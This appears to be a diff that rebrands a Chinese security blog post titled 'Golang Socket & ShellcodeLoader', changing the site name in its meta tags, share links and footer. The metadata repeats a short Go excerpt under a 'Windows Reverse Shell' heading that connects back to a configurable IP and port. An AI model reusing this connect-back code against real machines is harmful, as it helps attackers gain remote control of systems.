@@ -9,25 +9,17 @@
     <meta name="description" content="Windows Reverse Shell1、net.Dial回连：   1234backip :&#x3D; flag.String(&quot;d&quot;, &quot;127.0.0.1&quot;, &quot;ServerIpAdddress&quot;)backport :&#x3D; flag.Int(&quot;p&quot;, 1025, &quot;ServerPort&quot;)flag.Parse()conn, err :&#x3D; net.Dial(&quot;tcp&quot;, *backip+&quot;:&quot;+">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Golang Socket &amp; ShellcodeLoader">
-<meta property="og:url" content="https://x51.online/2019/11/26/Golang-study-bypass-wd/index.html">
-<meta property="og:site_name" content="x51">
+<meta property="og:url" content="https://xwuyi.com/2019/11/26/Golang-study-bypass-wd/index.html">
+<meta property="og:site_name" content="xwuyi&#39;s blog">
 <meta property="og:description" content="Windows Reverse Shell1、net.Dial回连：   1234backip :&#x3D; flag.String(&quot;d&quot;, &quot;127.0.0.1&quot;, &quot;ServerIpAdddress&quot;)backport :&#x3D; flag.Int(&quot;p&quot;, 1025, &quot;ServerPort&quot;)flag.Parse()conn, err :&#x3D; net.Dial(&quot;tcp&quot;, *backip+&quot;:&quot;+">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://x51.online/images/pasted-51.png">
-<meta property="og:image" content="https://x51.online/images/pasted-52.png">
+<meta property="og:image" content="https://xwuyi.com/images/pasted-51.png">
+<meta property="og:image" content="https://xwuyi.com/images/pasted-52.png">
 <meta property="article:published_time" content="2019-11-26T13:50:38.000Z">
 <meta property="article:modified_time" content="2020-06-28T03:08:03.079Z">
-<meta property="article:author" content="x51">
-<meta property="article:tag" content="x51">
-<meta property="article:tag" content="渗透">
-<meta property="article:tag" content="攻防">
-<meta property="article:tag" content="红蓝对抗">
-<meta property="article:tag" content="redteam">
-<meta property="article:tag" content="x51&#39;blog">
-<meta property="article:tag" content="渗透测试">
-<meta property="article:tag" content="网络安全">
+<meta property="article:author" content="xwuyi">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://x51.online/images/pasted-51.png">
+<meta name="twitter:image" content="https://xwuyi.com/images/pasted-51.png">
     
     
       
@@ -61,7 +53,7 @@
     <!-- rss -->
     
     
-      <link rel="alternate" href="/true" title="x51" type="application/atom+xml" />
+      <link rel="alternate" href="/true" title="xwuyi&#39;s blog" type="application/atom+xml" />
     
 <meta name="generator" content="Hexo 4.2.1"></head>
 
@@ -103,19 +95,19 @@
     <br/>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://x51.online/2019/11/26/Golang-study-bypass-wd/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=https://x51.online/2019/11/26/Golang-study-bypass-wd/&text=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://x51.online/2019/11/26/Golang-study-bypass-wd/&title=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://x51.online/2019/11/26/Golang-study-bypass-wd/&is_video=false&description=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Golang Socket &amp; ShellcodeLoader&body=Check out this article: https://x51.online/2019/11/26/Golang-study-bypass-wd/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=https://x51.online/2019/11/26/Golang-study-bypass-wd/&title=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=https://x51.online/2019/11/26/Golang-study-bypass-wd/&title=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://x51.online/2019/11/26/Golang-study-bypass-wd/&title=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=https://x51.online/2019/11/26/Golang-study-bypass-wd/&title=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://x51.online/2019/11/26/Golang-study-bypass-wd/&name=Golang Socket &amp; ShellcodeLoader&description=&lt;p&gt;&lt;img src=&#34;/images/pasted-51.png&#34; alt=&#34;upload successful&#34;&gt; &lt;/p&gt;
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://xwuyi.com/2019/11/26/Golang-study-bypass-wd/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://xwuyi.com/2019/11/26/Golang-study-bypass-wd/&text=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://xwuyi.com/2019/11/26/Golang-study-bypass-wd/&title=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://xwuyi.com/2019/11/26/Golang-study-bypass-wd/&is_video=false&description=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Golang Socket &amp; ShellcodeLoader&body=Check out this article: https://xwuyi.com/2019/11/26/Golang-study-bypass-wd/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://xwuyi.com/2019/11/26/Golang-study-bypass-wd/&title=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://xwuyi.com/2019/11/26/Golang-study-bypass-wd/&title=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://xwuyi.com/2019/11/26/Golang-study-bypass-wd/&title=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://xwuyi.com/2019/11/26/Golang-study-bypass-wd/&title=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://xwuyi.com/2019/11/26/Golang-study-bypass-wd/&name=Golang Socket &amp; ShellcodeLoader&description=&lt;p&gt;&lt;img src=&#34;/images/pasted-51.png&#34; alt=&#34;upload successful&#34;&gt; &lt;/p&gt;
 &lt;h4 id=&#34;Windows-Reverse-Shell&#34;&gt;&lt;a href=&#34;#Windows-Reverse-Shell&#34; class=&#34;headerlink&#34; title=&#34;Windows Reverse Shell&#34;&gt;&lt;/a&gt;Windows Reverse Shell&lt;/h4&gt;&lt;p&gt;1、&lt;code&gt;net.Dial&lt;/code&gt;回连：  &lt;/p&gt;
 &lt;figure class=&#34;highlight stata&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;backip := flag.&lt;span class=&#34;built_in&#34;&gt;String&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&#34;d&#34;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&#34;127.0.0.1&#34;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&#34;ServerIpAdddress&#34;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;backport := flag.Int(&lt;span class=&#34;string&#34;&gt;&#34;p&#34;&lt;/span&gt;, 1025, &lt;span class=&#34;string&#34;&gt;&#34;ServerPort&#34;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flag.&lt;span class=&#34;keyword&#34;&gt;Parse&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;conn, &lt;span class=&#34;keyword&#34;&gt;err&lt;/span&gt; := &lt;span class=&#34;keyword&#34;&gt;net&lt;/span&gt;.Dial(&lt;span class=&#34;string&#34;&gt;&#34;tcp&#34;&lt;/span&gt;, *backip+&lt;span class=&#34;string&#34;&gt;&#34;:&#34;&lt;/span&gt;+strconv.Itoa(*backport))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://x51.online/2019/11/26/Golang-study-bypass-wd/&t=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://xwuyi.com/2019/11/26/Golang-study-bypass-wd/&t=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -224,19 +216,19 @@
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://x51.online/2019/11/26/Golang-study-bypass-wd/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=https://x51.online/2019/11/26/Golang-study-bypass-wd/&text=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://x51.online/2019/11/26/Golang-study-bypass-wd/&title=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://x51.online/2019/11/26/Golang-study-bypass-wd/&is_video=false&description=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Golang Socket &amp; ShellcodeLoader&body=Check out this article: https://x51.online/2019/11/26/Golang-study-bypass-wd/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=https://x51.online/2019/11/26/Golang-study-bypass-wd/&title=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=https://x51.online/2019/11/26/Golang-study-bypass-wd/&title=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://x51.online/2019/11/26/Golang-study-bypass-wd/&title=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=https://x51.online/2019/11/26/Golang-study-bypass-wd/&title=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://x51.online/2019/11/26/Golang-study-bypass-wd/&name=Golang Socket &amp; ShellcodeLoader&description=&lt;p&gt;&lt;img src=&#34;/images/pasted-51.png&#34; alt=&#34;upload successful&#34;&gt; &lt;/p&gt;
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://xwuyi.com/2019/11/26/Golang-study-bypass-wd/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://xwuyi.com/2019/11/26/Golang-study-bypass-wd/&text=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://xwuyi.com/2019/11/26/Golang-study-bypass-wd/&title=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://xwuyi.com/2019/11/26/Golang-study-bypass-wd/&is_video=false&description=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Golang Socket &amp; ShellcodeLoader&body=Check out this article: https://xwuyi.com/2019/11/26/Golang-study-bypass-wd/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://xwuyi.com/2019/11/26/Golang-study-bypass-wd/&title=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://xwuyi.com/2019/11/26/Golang-study-bypass-wd/&title=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://xwuyi.com/2019/11/26/Golang-study-bypass-wd/&title=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://xwuyi.com/2019/11/26/Golang-study-bypass-wd/&title=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://xwuyi.com/2019/11/26/Golang-study-bypass-wd/&name=Golang Socket &amp; ShellcodeLoader&description=&lt;p&gt;&lt;img src=&#34;/images/pasted-51.png&#34; alt=&#34;upload successful&#34;&gt; &lt;/p&gt;
 &lt;h4 id=&#34;Windows-Reverse-Shell&#34;&gt;&lt;a href=&#34;#Windows-Reverse-Shell&#34; class=&#34;headerlink&#34; title=&#34;Windows Reverse Shell&#34;&gt;&lt;/a&gt;Windows Reverse Shell&lt;/h4&gt;&lt;p&gt;1、&lt;code&gt;net.Dial&lt;/code&gt;回连：  &lt;/p&gt;
 &lt;figure class=&#34;highlight stata&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;backip := flag.&lt;span class=&#34;built_in&#34;&gt;String&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&#34;d&#34;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&#34;127.0.0.1&#34;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&#34;ServerIpAdddress&#34;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;backport := flag.Int(&lt;span class=&#34;string&#34;&gt;&#34;p&#34;&lt;/span&gt;, 1025, &lt;span class=&#34;string&#34;&gt;&#34;ServerPort&#34;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flag.&lt;span class=&#34;keyword&#34;&gt;Parse&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;conn, &lt;span class=&#34;keyword&#34;&gt;err&lt;/span&gt; := &lt;span class=&#34;keyword&#34;&gt;net&lt;/span&gt;.Dial(&lt;span class=&#34;string&#34;&gt;&#34;tcp&#34;&lt;/span&gt;, *backip+&lt;span class=&#34;string&#34;&gt;&#34;:&#34;&lt;/span&gt;+strconv.Itoa(*backport))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://x51.online/2019/11/26/Golang-study-bypass-wd/&t=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://xwuyi.com/2019/11/26/Golang-study-bypass-wd/&t=Golang Socket &amp; ShellcodeLoader"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -258,7 +250,7 @@
     
     
     2019-2021
-    x51
+    xwuyi
   </div>
   <div class="footer-right">
     <nav>
